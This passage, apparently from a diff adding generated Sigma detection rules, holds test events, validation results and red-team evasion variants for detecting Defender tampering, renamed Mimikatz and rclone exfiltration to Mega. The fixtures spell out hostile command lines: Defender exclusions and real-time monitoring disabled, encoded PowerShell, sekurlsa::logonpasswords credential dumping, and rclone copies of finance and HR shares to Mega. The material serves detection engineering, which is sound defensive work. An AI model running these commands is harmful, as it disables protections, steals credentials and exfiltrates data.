+            "CommandLine": "pwsh.exe -Command \"Add-MpPreference -ExclusionPath 'C:\\PerfLogs' ; Add-MpPreference -ExclusionPath 'C:\\ProgramData\\AnyDesk' ; Set-MpPreference -DisableRealtimeMonitoring $true\"",
+            "User": "CORP\\redteam",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        {
+          "id": "X2",
+          "label": "positive",
+          "description": "PowerShell invoked with -EncodedCommand (base64) - command line substrings not visible to sensor",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -EncodedCommand QWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAnQzpcUGVyZkxvZ3MnIDs...",
+            "User": "CORP\\redteam",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        {
+          "id": "X3",
+          "label": "positive",
+          "description": "PowerShell using environment variable %SystemDrive% to reference C: drive - literal substrings absent",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -Command \"Add-MpPreference -ExclusionPath '%SystemDrive%\\PerfLogs' ; Add-MpPreference -ExclusionPath '%SystemDrive%\\ProgramData\\AnyDesk' ; Set-MpPreference -DisableRealtimeMonitoring $true\"",
+            "User": "CORP\\redteam",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        {
+          "id": "X4",
+          "label": "positive",
+          "description": "PowerShell using 8.3 short names (C:\\PERFLO~1) - literal 'C:\\PerfLogs' not present",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -Command \"Add-MpPreference -ExclusionPath 'C:\\PERFLO~1' ; Add-MpPreference -ExclusionPath 'C:\\PROGRA~1\\ANYDES~1' ; Set-MpPreference -DisableRealtimeMonitoring $true\"",
+            "User": "CORP\\redteam",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        {
+          "id": "X5",
+          "label": "positive",
+          "description": "Renamed copy of powershell.exe (evil.exe) - Image no longer ends with powershell.exe and OriginalFileName not in logsource",
+          "event": {
+            "Image": "C:\\Temp\\evil.exe",
+            "CommandLine": "evil.exe -Command \"Add-MpPreference -ExclusionPath 'C:\\PerfLogs' ; Add-MpPreference -ExclusionPath 'C:\\ProgramData\\AnyDesk' ; Set-MpPreference -DisableRealtimeMonitoring $true\"",
+            "User": "CORP\\redteam",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        {
+          "id": "X6",
+          "label": "positive",
+          "description": "PowerShell using UNC path \\\\localhost\\C$\\PerfLogs - literal 'C:\\PerfLogs' absent",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -Command \"Add-MpPreference -ExclusionPath '\\\\localhost\\C$\\PerfLogs' ; Add-MpPreference -ExclusionPath '\\\\localhost\\C$\\ProgramData\\AnyDesk' ; Set-MpPreference -DisableRealtimeMonitoring $true\"",
+            "User": "CORP\\redteam",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        }
+      ]
+    },
+    {
+      "candidate_id": "D3",
+      "title": "Potential Renamed Mimikatz Execution from PerfLogs Directory",
+      "sigma_yaml": "title: Potential Renamed Mimikatz Execution from PerfLogs Directory\nid: 23fcddb1-34d0-4151-a82e-252bb1adbccc\nstatus: experimental\ndescription: 'Detects execution of a binary named mm.exe from the C:\\PerfLogs directory, which is characteristic of renamed\n  Mimikatz usage for credential dumping as observed in Kestrel ransomware affiliate intrusions.'\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-17'\ntags:\n- attack.credential-access\n- attack.t1003.001\nlogsource:\n  category: process_creation\n  product: windows\n  service: sysmon\ndetection:\n  selection_img:\n    'Image|endswith': '\\mm.exe'\n  selection_filepath:\n    'Image|contains': '\\PerfLogs\\'\n  filter_admin_utils:\n    'CommandLine|contains': /query\n  condition: selection_img and selection_filepath and not filter_admin_utils\nfalsepositives:\n- 'Legitimate application named mm.exe executed from C:\\PerfLogs by authorized software or scripts'\n- Misnamed system or administrative tool placed in PerfLogs directory for troubleshooting\n- Administrative utilities run from PerfLogs for troubleshooting purposes\nlevel: high\n",
+      "status": "validated",
+      "attack_technique_ids": [
+        "T1003.001"
+      ],
+      "tests": [
+        {
+          "id": "P1",
+          "label": "positive",
+          "description": "Direct execution of mm.exe from PerfLogs as seen in the intrusion",
+          "event": {
+            "Image": "C:\\PerfLogs\\mm.exe",
+            "CommandLine": "mm.exe",
+            "CurrentDirectory": "C:\\PerfLogs",
+            "User": "NT AUTHORITY\\SYSTEM"
+          }
+        },
+        {
+          "id": "P2",
+          "label": "positive",
+          "description": "Execution with explicit path from different user context",
+          "event": {
+            "Image": "C:\\PerfLogs\\mm.exe",
+            "CommandLine": "C:\\PerfLogs\\mm.exe",
+            "CurrentDirectory": "C:\\Windows\\System32",
+            "User": "CORP\\svc_account"
+          }
+        },
+        {
+          "id": "P3",
+          "label": "positive",
+          "description": "Execution with additional arguments mimicking credential dump",
+          "event": {
+            "Image": "C:\\PerfLogs\\mm.exe",
+            "CommandLine": "mm.exe sekurlsa::logonpasswords exit",
+            "CurrentDirectory": "C:\\PerfLogs",
+            "User": "CORP\\admin"
+          }
+        },
+        {
+          "id": "N1",
+          "label": "negative",
+          "description": "Legitimate mm.exe from non-PerfLogs location (e.g., software vendor)",
+          "event": {
+            "Image": "C:\\Program Files\\LegacyTool\\mm.exe",
+            "CommandLine": "\"C:\\Program Files\\LegacyTool\\mm.exe\" /start",
+            "CurrentDirectory": "C:\\Program Files\\LegacyTool",
+            "User": "CORP\\user"
+          }
+        },
+        {
+          "id": "N2",
+          "label": "negative",
+          "description": "System utility copied to PerfLogs for admin task",
+          "event": {
+            "Image": "C:\\PerfLogs\\mm.exe",
+            "CommandLine": "mm.exe /query",
+            "CurrentDirectory": "C:\\PerfLogs",
+            "User": "CORP\\admin"
+          }
+        },
+        {
+          "id": "N3",
+          "label": "negative",
+          "description": "Similar named binary from standard location",
+          "event": {
+            "Image": "C:\\Windows\\System32\\mmc.exe",
+            "CommandLine": "mmc.exe devmgmt.msc",
+            "CurrentDirectory": "C:\\Windows\\System32",
+            "User": "NT AUTHORITY\\SYSTEM"
+          }
+        },
+        {
+          "id": "N2_fixed",
+          "label": "negative",
+          "description": "System utility copied to PerfLogs for admin task - now filtered out",
+          "event": {
+            "Image": "C:\\PerfLogs\\mm.exe",
+            "CommandLine": "mm.exe /query",
+            "CurrentDirectory": "C:\\PerfLogs",
+            "User": "CORP\\admin"
+          }
+        },
+        {
+          "id": "R1",
+          "label": "positive",
+          "description": "Case variation on binary name and path to test case-insensitive matching",
+          "event": {
+            "Image": "C:\\PerfLogs\\MM.EXE",
+            "CommandLine": "MM.EXE sekurlsa::logonpasswords exit",
+            "CurrentDirectory": "C:\\PerfLogs",
+            "User": "CORP\\admin2"
+          }
+        },
+        {
+          "id": "R2",
+          "label": "positive",
+          "description": "Quoted full path in CommandLine with extra arguments",
+          "event": {
+            "Image": "C:\\PerfLogs\\mm.exe",
+            "CommandLine": "\"C:\\PerfLogs\\mm.exe\" sekurlsa::logonpasswords",
+            "CurrentDirectory": "C:\\Windows\\System32",
+            "User": "NT AUTHORITY\\SYSTEM"
+          }
+        },
+        {
+          "id": "R3",
+          "label": "positive",
+          "description": "Extra whitespace and mixed casing in command line",
+          "event": {
+            "Image": "C:\\PerfLogs\\mm.exe",
+            "CommandLine": "  mm.exe   sekurlsa::logonpasswords  exit  ",
+            "CurrentDirectory": "C:\\PerfLogs",
+            "User": "CORP\\svc_account2"
+          }
+        },
+        {
+          "id": "R4",
+          "label": "positive",
+          "description": "Execution from a subdirectory under PerfLogs",
+          "event": {
+            "Image": "C:\\PerfLogs\\Tools\\mm.exe",
+            "CommandLine": "mm.exe",
+            "CurrentDirectory": "C:\\PerfLogs\\Tools",
+            "User": "CORP\\admin3"
+          }
+        },
+        {
+          "id": "R5",
+          "label": "negative",
+          "description": "Legitimate admin utility named mm.exe in PerfLogs run with /query flag (should be filtered out)",
+          "event": {
+            "Image": "C:\\PerfLogs\\mm.exe",
+            "CommandLine": "mm.exe /query status",
+            "CurrentDirectory": "C:\\PerfLogs",
+            "User": "CORP\\admin"
+          }
+        },
+        {
+          "id": "R6",
+          "label": "negative",
+          "description": "Different binary name in PerfLogs (mimikatz.exe) with credential dump arguments",
+          "event": {
+            "Image": "C:\\PerfLogs\\mimikatz.exe",
+            "CommandLine": "mimikatz.exe sekurlsa::logonpasswords",
+            "CurrentDirectory": "C:\\PerfLogs",
+            "User": "CORP\\admin"
+          }
+        },
+        {
+          "id": "R7",
+          "label": "negative",
+          "description": "mm.exe executed from a non-PerfLogs directory (Windows\\Temp)",
+          "event": {
+            "Image": "C:\\Windows\\Temp\\mm.exe",
+            "CommandLine": "mm.exe sekurlsa::logonpasswords",
+            "CurrentDirectory": "C:\\Windows\\Temp",
+            "User": "CORP\\admin"
+          }
+        },
+        {
+          "id": "R8",
+          "label": "negative",
+          "description": "Installer running mm.exe from PerfLogs with /query install argument",
+          "event": {
+            "Image": "C:\\PerfLogs\\mm.exe",
+            "CommandLine": "mm.exe /query install",
+            "CurrentDirectory": "C:\\PerfLogs",
+            "User": "NT AUTHORITY\\SYSTEM"
+          }
+        }
+      ],
+      "validation": {
+        "candidate_id": "D3",
+        "parse_ok": true,
+        "sql": "SELECT * FROM logs WHERE Image LIKE '%\\\\mm.exe' ESCAPE '\\' AND Image LIKE '%\\\\PerfLogs\\\\%' ESCAPE '\\' AND (NOT COALESCE((CommandLine LIKE '%/query%' ESCAPE '\\'), 0))",
+        "issues": [],
+        "test_outcomes": [
+          {
+            "event_id": "P1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "N1",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N2",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N3",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N2_fixed",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R4",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R5",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R6",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R7",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R8",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          }
+        ],
+        "positives_total": 7,
+        "positives_matched": 7,
+        "negatives_total": 8,
+        "negatives_matched": 0,
+        "benign_total": 1200,
+        "benign_hits": 0,
+        "benign_examples": [],
+        "passed": true
+      },
+      "conversions": {
+        "splunk": "Image=\"*\\\\mm.exe\" Image=\"*\\\\PerfLogs\\\\*\" NOT CommandLine=\"*/query*\"",
+        "elasticsearch": "Image:*\\\\mm.exe AND Image:*\\\\PerfLogs\\\\* AND (NOT CommandLine:*\\/query*)",
+        "kusto": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\mm.exe\" and FolderPath contains \"\\\\PerfLogs\\\\\" and (not(ProcessCommandLine contains \"/query\"))",
+        "sqlite": "SELECT * FROM logs WHERE Image LIKE '%\\\\mm.exe' ESCAPE '\\' AND Image LIKE '%\\\\PerfLogs\\\\%' ESCAPE '\\' AND (NOT COALESCE((CommandLine LIKE '%/query%' ESCAPE '\\'), 0))"
+      },
+      "conversion_errors": {},
+      "history": [
+        {
+          "iteration": 0,
+          "phase": "initial",
+          "summary": "positives 2/3, negatives blocked 2/3, benign hits 0/1200",
+          "passed": false,
+          "change_summary": ""
+        },
+        {
+          "iteration": 1,
+          "phase": "refine",
+          "summary": "positives 3/3, negatives blocked 2/3, benign hits 0/1200",
+          "passed": false,
+          "change_summary": "Replaced strict CurrentDirectory check with flexible Image path containing PerfLogs to capture executions where the working directory differs from the binary location while maintaining specificity to the PerfLogs directory."
+        },
+        {
+          "iteration": 2,
+          "phase": "refine",
+          "summary": "positives 3/3, negatives blocked 4/4, benign hits 0/1200",
+          "passed": true,
+          "change_summary": "Added filter for common administrative utility flags (/query) to prevent false positives while maintaining detection of malicious mm.exe executions."
+        },
+        {
+          "iteration": 2,
+          "phase": "redteam",
+          "summary": "8 evasion variants -> positives 7/7, negatives blocked 8/8, benign hits 0/1200",
+          "passed": true,
+          "change_summary": ""
+        }
+      ],
+      "author_notes": "Rule focuses on the rare combination of process name 'mm.exe' executing from the attacker-controlled C:\\PerfLogs directory. While false positives are possible if legitimate software uses this name/path, the PerfLogs directory is typically empty and not used by legitimate applications, making this combination highly suspicious. The rule avoids command-line arguments to maintain breadth since Mimikatz can be invoked with various parameters, relying instead on the distinctive parent directory.",
+      "redteam_analysis": "The positive variants (P4-P7) test case insensitivity, quoting, whitespace tolerance, and subdirectory depth—all surface changes a well-written rule should normalize before matching. The negative variants (N1-N4) represent benign administrative or installer activity that either includes the 'query' filter token or lacks the exact mm.exe/PerfLogs combination, ensuring the rule stays specific. Out-of-scope items (OOS1-OOS3) are real attacker adaptations that this rule's logic (fixed filename + fixed directory) cannot cover: renaming the binary, changing the staging folder, or avoiding process creation entirely. These are documented for the analyst to decide whether additional rules are needed.",
+      "redteam_out_of_scope": [
+        {
+          "id": "X1",
+          "label": "positive",
+          "description": "Attacker renames Mimikatz to a different filename (e.g., creds.exe) and places it in PerfLogs; rule only triggers on mm.exe",
+          "event": {
+            "Image": "C:\\PerfLogs\\creds.exe",
+            "CommandLine": "creds.exe sekurlsa::logonpasswords",
+            "CurrentDirectory": "C:\\PerfLogs",
+            "User": "CORP\\admin"
+          }
+        },
+        {
+          "id": "X2",
+          "label": "positive",
+          "description": "Attacker uses a different staging directory (C:\\Temp) with mm.exe; rule requires PerfLogs path",
+          "event": {
+            "Image": "C:\\Temp\\mm.exe",
+            "CommandLine": "mm.exe sekurlsa::logonpasswords",
+            "CurrentDirectory": "C:\\Temp",
+            "User": "CORP\\admin"
+          }
+        },
+        {
+          "id": "X3",
+          "label": "positive",
+          "description": "Reflective in-memory execution of Mimikatz (no process creation event); not visible in process_creation logs",
+          "event": {
+            "Image": "C:\\Windows\\System32\\lsass.exe",
+            "CommandLine": "C:\\Windows\\System32\\lsass.exe",
+            "CurrentDirectory": "C:\\Windows\\System32",
+            "User": "NT AUTHORITY\\SYSTEM"
+          }
+        }
+      ]
+    },
+    {
+      "candidate_id": "D4",
+      "title": "Renamed Svchost.Exe Used As Rclone For Mega Exfiltration",
+      "sigma_yaml": "title: Renamed Svchost.Exe Used As Rclone For Mega Exfiltration\nid: 027eec87-5469-4849-bbf8-ab7d0efbb226\nstatus: experimental\ndescription: Detects svchost.exe with mismatched OriginalFileName=rclone.exe executing a Mega exfiltration command line, indicating\n  data theft via renamed rclone.\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-17'\ntags:\n- attack.exfiltration\n- attack.t1048.003\nlogsource:\n  category: process_creation\n  product: windows\n  service: sysmon\ndetection:\n  selection_img:\n    'Image|endswith': '\\svchost.exe'\n  selection_on:\n    OriginalFileName: rclone.exe\n  selection_cli:\n    'CommandLine|contains':\n    - 'mega:'\n    - copy\n  condition: 'all of selection_*'\nfalsepositives:\n- Legitimate svchost.exe processes with cloned or spoofed OriginalFileName (unlikely in enterprise environments)\nlevel: high\n",
+      "status": "validated",
+      "attack_technique_ids": [
+        "T1048.003"
+      ],
+      "tests": [
+        {
+          "id": "P1",
+          "label": "positive",
+          "description": "Malicious svchost.exe renamed rclone executing Mega exfiltration from finance share",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "C:\\PerfLogs\\svchost.exe copy \\\\FS-02\\Finance mega:backup/fin --transfers 16 --config C:\\PerfLogs\\rc.conf --ignore-existing",
+            "Company": "-",
+            "Computer": "WKS-FINANCE01",
+            "CurrentDirectory": "C:\\PerfLogs\\",
+            "Description": "-",
+            "EventID": 1,
+            "FileVersion": "-",
+            "Hashes": "SHA1=DA39A3EE5E6B4B0D3255BFEF95601890AFD80709",
+            "Image": "C:\\PerfLogs\\svchost.exe",
+            "IntegrityLevel": "Medium",
+            "OriginalFileName": "rclone.exe",
+            "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe /c start",
+            "ParentImage": "C:\\Windows\\system32\\cmd.exe",
+            "ProcessGuid": "{7890ABCD-1234-5678-90AB-CDEF01234567}",
+            "ProcessId": "5432",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-12 14:30:00.000"
+          }
+        },
+        {
+          "id": "P2",
+          "label": "positive",
+          "description": "Alternate casing and path variant of renamed rclone exfiltration",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "c:\\perflogs\\svchost.exe copy \\\\fs-02\\finance mega:Backup/Fin --transfers 8",
+            "Company": "-",
+            "Computer": "WKS-FINANCE02",
+            "CurrentDirectory": "c:\\perflogs\\",
+            "Description": "-",
+            "EventID": 1,
+            "FileVersion": "-",
+            "Hashes": "SHA1=DA39A3EE5E6B4B0D3255BFEF95601890AFD80709",
+            "Image": "c:\\perflogs\\svchost.exe",
+            "IntegrityLevel": "Medium",
+            "OriginalFileName": "rclone.exe",
+            "ParentCommandLine": "powershell.exe -ExecutionPolicy Bypass -File start.ps1",
+            "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "ProcessGuid": "{7890ABCD-1234-5678-90AB-CDEF01234568}",
+            "ProcessId": "5433",
+            "User": "DOMAIN\\svc_backup",
+            "UtcTime": "2024-06-12 15:45:00.000"
+          }
+        },
+        {
+          "id": "P3",
+          "label": "positive",
+          "description": "SysWOW64 variant showing same behavior on 32-bit subsystem",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "C:\\PerfLogs\\svchost.exe copy \\\\FS-02\\Finance mega:finance_data --config C:\\PerfLogs\\rc.json --exclude .tmp~",
+            "Company": "-",
+            "Computer": "WKS-FINANCE03",
+            "CurrentDirectory": "C:\\PerfLogs\\",
+            "Description": "-",
+            "EventID": 1,
+            "FileVersion": "-",
+            "Hashes": "SHA1=DA39A3EE5E6B4B0D3255BFEF95601890AFD80709",
+            "Image": "C:\\Windows\\SysWOW64\\svchost.exe",
+            "IntegrityLevel": "Medium",
+            "OriginalFileName": "rclone.exe",
+            "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
+            "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+            "ProcessGuid": "{7890ABCD-1234-5678-90AB-CDEF01234569}",
+            "ProcessId": "5434",
+            "User": "NT AUTHORITY\\NETWORK SERVICE",
+            "UtcTime": "2024-06-12 16:00:00.000"
+          }
+        },
+        {
+          "id": "N1",
+          "label": "negative",
+          "description": "Legitimate svchost.exe with correct OriginalFileName hosting network service",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "-k netsvcs",
+            "Company": "Microsoft Corporation",
+            "Computer": "WKS-DC01",
+            "CurrentDirectory": "C:\\Windows\\system32\\",
+            "Description": "Host Process for Windows Services",
+            "EventID": 1,
+            "FileVersion": "10.0.19041.1 (WinBuild.160101.0800)",
+            "Hashes": "SHA1=8A5F3C2E4D1B6A9C7F3E2D1B6A9C7F3E2D1B6A9C",
+            "Image": "C:\\Windows\\system32\\svchost.exe",
+            "IntegrityLevel": "System",
+            "OriginalFileName": "svchost.exe",
+            "ParentCommandLine": "services.exe",
+            "ParentImage": "C:\\Windows\\system32\\services.exe",
+            "ProcessGuid": "{12345678-1234-5678-90AB-CDEF01234567}",
+            "ProcessId": "892",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-12 08:15:00.000"
+          }
+        },
+        {
+          "id": "N2",
+          "label": "negative",
+          "description": "Admin using legitimate rclone for backup (not renamed)",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "C:\\Tools\\rclone.exe copy C:\\Backups mega:monthly --log-level INFO",
+            "Company": "-",
+            "Computer": "WKS-ADMIN01",
+            "CurrentDirectory": "C:\\Tools\\",
+            "Description": "-",
+            "EventID": 1,
+            "FileVersion": "-",
+            "Hashes": "SHA1=DEF0123456789ABCDEF0123456789ABCDEF01234",
+            "Image": "C:\\Tools\\rclone.exe",
+            "IntegrityLevel": "High",
+            "OriginalFileName": "rclone.exe",
+            "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+            "ParentImage": "C:\\Windows\\system32\\cmd.exe",
+            "ProcessGuid": "{890ABCDE-1234-5678-90AB-CDEF01234567}",
+            "ProcessId": "3344",
+            "User": "DOMAIN\\backup_admin",
+            "UtcTime": "2024-06-12 09:30:00.000"
+          }
+        },
+        {
+          "id": "N3",
+          "label": "negative",
+          "description": "Scheduled task using svchost.exe for legitimate Windows Update",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "-k imgsvc",
+            "Company": "Microsoft Corporation",
+            "Computer": "WKS-UPDATE01",
+            "CurrentDirectory": "C:\\Windows\\system32\\",
+            "Description": "Host Process for Windows Services",
+            "EventID": 1,
+            "FileVersion": "10.0.19041.1 (WinBuild.160101.0800)",
+            "Hashes": "SHA1=8A5F3C2E4D1B6A9C7F3E2D1B6A9C7F3E2D1B6A9C",
+            "Image": "C:\\Windows\\system32\\svchost.exe",
+            "IntegrityLevel": "System",
+            "OriginalFileName": "svchost.exe",
+            "ParentCommandLine": "C:\\Windows\\System32\\schtasks.exe",
+            "ParentImage": "C:\\Windows\\System32\\schtasks.exe",
+            "ProcessGuid": "{90123456-1234-5678-90AB-CDEF01234567}",
+            "ProcessId": "1122",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-12 10:00:00.000"
+          }
+        },
+        {
+          "id": "R1",
+          "label": "positive",
+          "description": "Renamed rclone as svchost.exe in user AppData with quoted UNC path and mixed casing",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "\"C:\\Users\\svc_backup\\AppData\\Local\\svchost.exe\" copy \"\\\\FS-02\\Finance\" \"mega:exfil/quarterly\" --transfers 32 --config \"C:\\Users\\svc_backup\\AppData\\Local\\rclone.conf\"",
+            "Company": "-",
+            "Computer": "WKS-FINANCE04",
+            "CurrentDirectory": "C:\\Users\\svc_backup\\AppData\\Local\\",
+            "Description": "-",
+            "EventID": 1,
+            "FileVersion": "-",
+            "Hashes": "SHA1=DA39A3EE5E6B4B0D3255BFEF95601890AFD80709",
+            "Image": "C:\\Users\\svc_backup\\AppData\\Local\\svchost.exe",
+            "IntegrityLevel": "Medium",
+            "OriginalFileName": "rclone.exe",
+            "ParentCommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -c \"& {Start-Process 'C:\\Users\\svc_backup\\AppData\\Local\\svchost.exe' -Args 'copy \\\\FS-02\\Finance mega:exfil/quarterly --transfers 32 --config C:\\Users\\svc_backup\\AppData\\Local\\rclone.conf'}\"",
+            "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "ProcessGuid": "{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}",
+            "ProcessId": "6123",
+            "User": "DOMAIN\\svc_backup",
+            "UtcTime": "2024-06-13 08:15:00.000"
+          }
+        },
+        {
+          "id": "R2",
+          "label": "positive",
+          "description": "Sysnative (Arm64) path variant with environment variable expansion and single quotes",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "%TEMP%\\svchost.exe copy \\\\FS-03\\Data mega:backup/project --include \"*.xlsx\" --max-age 30d",
+            "Company": "-",
+            "Computer": "WKS-ARM01",
+            "CurrentDirectory": "C:\\Windows\\Temp\\",
+            "Description": "-",
+            "EventID": 1,
+            "FileVersion": "-",
+            "Hashes": "SHA1=DA39A3EE5E6B4B0D3255BFEF95601890AFD80709",
+            "Image": "C:\\Windows\\Sysnative\\svchost.exe",
+            "IntegrityLevel": "Medium",
+            "OriginalFileName": "rclone.exe",
+            "ParentCommandLine": "C:\\Windows\\System32\\cmd.exe /c \"%TEMP%\\svchost.exe copy \\\\FS-03\\Data mega:backup/project --include *.xlsx --max-age 30d\"",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ProcessGuid": "{B2C3D4E5-F6A7-8901-BCDE-F23456789012}",
+            "ProcessId": "7234",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-13 09:30:00.000"
+          }
+        },
+        {
+          "id": "R3",
+          "label": "positive",
+          "description": "8.3 short path name with pwsh parent and reversed argument order",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "C:\\PERFLO~1\\svchost.exe mega:offload/2024 copy \\\\FS-04\\Archive --dry-run --log-file C:\\PERFLO~1\\rclone.log",
+            "Company": "-",
+            "Computer": "WKS-FINANCE05",
+            "CurrentDirectory": "C:\\PerfLogs\\",
+            "Description": "-",
+            "EventID": 1,
+            "FileVersion": "-",
+            "Hashes": "SHA1=DA39A3EE5E6B4B0D3255BFEF95601890AFD80709",
+            "Image": "C:\\PERFLO~1\\svchost.exe",
+            "IntegrityLevel": "Medium",
+            "OriginalFileName": "rclone.exe",
+            "ParentCommandLine": "C:\\Program Files\\PowerShell\\7\\pwsh.exe -Command \"C:\\PERFLO~1\\svchost.exe mega:offload/2024 copy \\\\FS-04\\Archive --dry-run --log-file C:\\PERFLO~1\\rclone.log\"",
+            "ParentImage": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+            "ProcessGuid": "{C3D4E5F6-A7B8-9012-CDEF-345678901234}",
+            "ProcessId": "8345",
+            "User": "DOMAIN\\admin_jdoe",
+            "UtcTime": "2024-06-13 10:45:00.000"
+          }
+        },
+        {
+          "id": "R4",
+          "label": "positive",
+          "description": "WScript-launched svchost.exe with double-quoted mega remote and copy flag",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "\"C:\\Windows\\SysWOW64\\svchost.exe\" copy \"\\\\BACKUP-SRV\\Shares\\HR\" \"mega:hr_exfil\" --config \"C:\\Windows\\SysWOW64\\.rclone.conf\" --bwlimit 10M",
+            "Company": "-",
+            "Computer": "WKS-HR01",
+            "CurrentDirectory": "C:\\Windows\\SysWOW64\\",
+            "Description": "-",
+            "EventID": 1,
+            "FileVersion": "-",
+            "Hashes": "SHA1=DA39A3EE5E6B4B0D3255BFEF95601890AFD80709",
+            "Image": "C:\\Windows\\SysWOW64\\svchost.exe",
+            "IntegrityLevel": "Medium",
+            "OriginalFileName": "rclone.exe",
+            "ParentCommandLine": "C:\\Windows\\System32\\wscript.exe //B //Nologo C:\\Windows\\Tasks\\sync.vbs",
+            "ParentImage": "C:\\Windows\\System32\\wscript.exe",
+            "ProcessGuid": "{D4E5F6A7-B8C9-0123-DEFA-456789012345}",
+            "ProcessId": "9456",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-13 11:20:00.000"
+          }
+        },
+        {
+          "id": "R5",
+          "label": "positive",
+          "description": "Scheduled task spawn with UNC path containing spaces and trailing backslash",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe copy \"\\\\FS-05\\Executive Docs\\\" mega:exec/steal --progress --stats 10s",
+            "Company": "-",
+            "Computer": "WKS-EXEC01",
+            "CurrentDirectory": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
+            "Description": "-",
+            "EventID": 1,
+            "FileVersion": "-",
+            "Hashes": "SHA1=DA39A3EE5E6B4B0D3255BFEF95601890AFD80709",
+            "Image": "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.exe",
+            "IntegrityLevel": "Medium",
+            "OriginalFileName": "rclone.exe",
+            "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
+            "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+            "ProcessGuid": "{E5F6A7B8-C9D0-1234-EFAB-567890123456}",
+            "ProcessId": "10567",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "UtcTime": "2024-06-13 12:00:00.000"
+          }
+        },
+        {
+          "id": "R6",
+          "label": "negative",
+          "description": "Legitimate Windows svchost.exe hosting a service (correct OriginalFileName)",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule",
+            "Company": "Microsoft Corporation",
+            "Computer": "WKS-GEN01",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "Description": "Host Process for Windows Services",
+            "EventID": 1,
+            "FileVersion": "10.0.19041.1",
